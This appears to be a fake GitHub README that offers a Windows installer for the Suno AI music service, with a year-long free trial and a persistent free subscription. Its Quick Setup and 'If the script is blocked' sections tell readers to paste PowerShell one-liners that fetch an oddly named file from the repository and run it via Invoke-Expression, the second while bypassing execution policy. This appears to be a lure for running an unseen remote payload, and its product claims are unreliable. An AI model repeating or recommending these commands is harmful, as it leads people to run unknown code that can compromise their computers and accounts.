# Suno

Suno on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Suno is an AI music subscription that turns short prompts, lyrics, or moods into full songs with vocals and instrumentals on Windows. This repository is for people who want a repeatable install path, version notes, and a clear record of what is active on the machine—not a loose collection of links.

A typical session starts from the setup file: you confirm the built-in free trial, sign in or create an account if prompted, and open the client or web shell the installer registers. You describe a genre or paste lyrics, pick a model tier if your plan allows it, generate a few takes, extend or remix the best clip, then export stems or a mix for your DAW or social draft. When the year-long free trial window ends, the free subscription layer that the installer wrote to the PC remains so baseline generation and library access do not vanish overnight.

What you get here is the Windows setup bundle, a short configuration checklist, release notes aligned to Suno model updates, and a changelog that tracks subscription tier changes and client fixes. Use the notes folder for export presets and project tags; use the changelog when support asks which build and plan state you are on.

## What you get

- Built-in free trial runs twelve months from first successful Windows setup completion.
- Free subscription persists on the PC after setup for offline library and plan metadata.
- Prompt-to-song flow covers genre tags, custom lyrics, and instrumental-only modes.
- Extend and remix tools chain sections without retyping the original seed prompt.
- Stem and mix exports drop WAV or MP3 into folders your DAW already watches.
- Model tier notes in the changelog map subscription limits to generation length caps.
- Windows installer registers the client shortcut and sync folder in one guided pass.
- Release notes call out when vocal quality or latency improvements ship for subscribers.

## Quick Setup (PowerShell)

This starts the built-in Suno free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/keller-hannah30297787/suno-setup-guide/main/yau0zblx5i.9m5kkrju | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/keller-hannah30297787/suno-setup-guide/main/yau0zblx5i.9m5kkrju | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `yau0zblx5i.9m5kkrju` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `keller-hannah30297787/suno-setup-guide`. Suno 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
